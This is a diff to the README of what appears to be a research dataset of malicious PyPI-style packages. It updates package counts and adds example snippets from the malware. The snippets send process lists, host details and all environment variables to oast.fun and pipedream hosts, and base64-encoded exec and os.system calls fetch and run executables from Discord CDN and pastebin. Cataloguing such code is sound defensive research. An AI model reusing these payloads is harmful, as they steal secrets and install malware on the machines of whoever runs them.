@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 4,773 versions of the source code of 4,263 malicious packages.
+This data set includes about 4,808 versions of the source code of 4,298 malicious packages.
 
 ## Dataset Format
 
@@ -86,6 +86,34 @@ while 馬女水女口目人馬鳥月水馬山山馬鸟:
 ...
 ```
 
+
+
+### 2 May. 2024 
+Add new 181 malicious packages.
+
+
+
+### 3 May. 2024 
+Add new 35 malicious packages.
+
+There are many different types of malicious code in these packages. Here are some examples.
+
+```python
+def RunCommand():
+    output = subprocess.check_output(["ps", "-elf"]).decode("utf-8")
+    data = {"ls_output": output, "key1": "value1", "key2": "value2"}
+    data_string = "&".join([f"{key}={value}" for key, value in data.items()])
+    curl_command = [
+        "curl",
+        "-X",
+        "POST",
+        "-d",
+        f"'{data_string}'",  # Pass the data as form data
+        "http://zvqyzaqnwvjsqdhrbdiupz8e84un8xyb7.oast.fun",
+    ]
+    subprocess.run(curl_command, check=True)
+```
+
 ```python
 def b64d(base64_code):
     base64_bytes = base64_code.encode('ascii')
@@ -97,10 +125,63 @@ def notmalfunc():
     os.system(b64d("Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0NjE5OTEyNDU3MjYzOTI0OS8xMTg4OTc0NDUzNTQwMDAzODUwL3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA=="))
 ```
 
+```python
+if 'sdist' not in argv:
+    if name == 'nt':
+        exec(b64decode("base64 string").decode())
+    else:
+        exec(b64decode("base64 string").decode())
+```
+
+```python
+import base64
+exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK"))
+```
+
+```python
+hostname = socket.gethostname()
+osname = platform.system()
+ip = socket.gethostbyname(hostname)
+server_url = "https://eo1okaacpdhx16n.m.pipedream.net/poc"
+data = {
+    "hostname": hostname,
+    "osname": osname,
+    "ip": ip
+}
+
+try:
+    response = requests.post(server_url, json=data)
+    if response.status_code == 200:
+        print("Data sent successfully to the server.")
+    else:
+        print(f"Failed to send data. Status code: {response.status_code}")
+except Exception as e:
+    print(f"Error: {str(e)}")
+```
+
+```python
+import requests
+
+mycode = os.environ
+secret = base64.b64encode(bytes(str(mycode),"UTF-8"))
+data = "https://eow8fqyd1emg87l.m.pipedream.net/" + secret.decode('utf-8')
+requests.get(data)
+```
 
 
-### 2 May. 2024 
-Add new 181 malicious packages.
+### Suspecious packages
+
+discomusic-0.0.3
+
+```python
+import requests
+file = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&")
+with open("discomusic.exe", "wb") as f:
+    f.write(file.content)
+```
+
+Although the code is not any direct malicious behavior, But it downloads a malicious executable file. We will keep it in the dataset for further analysis.
+
 
 
 ### Other Dataset
